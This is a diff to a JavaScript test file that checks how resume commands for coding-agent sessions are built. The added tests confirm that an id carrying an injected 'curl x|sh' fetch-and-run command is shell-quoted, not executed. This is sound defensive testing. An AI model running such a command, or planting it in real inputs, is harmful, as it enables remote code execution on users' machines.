@@ -951,6 +951,9 @@ assert.ok(run("metaHTML(model.items.find((i) => i.id === 'f3'))").includes('<spa
 assert.equal(run("dayWords(86400 + 5)"), 'a day');
 assert.equal(run("resumeCommand({provider: 'claude-code', external_id: 'u1'})"), 'claude --resume u1');
 assert.equal(run("resumeCommand({provider: 'claude-desktop', external_id: 'u1'})"), '');
+// An id an agent planted with shell in it is quoted, never run.
+assert.equal(run(`resumeCommand({provider: 'claude-code', external_id: "1111 ; curl x|sh #"})`), `claude --resume '1111 ; curl x|sh #'`);
+assert.equal(run(`resumeCommand({provider: 'codex', external_id: "a'b"})`), `codex resume 'a'\\''b'`);
 // Not acted on: every stuck decision, oldest first, by project.
 assert.deepEqual(Array.from(run('stuckItems().map((i) => i.id)')), ['f5', 'f4', 'f3']);
 run("route = parseRoute('#/stuck')");
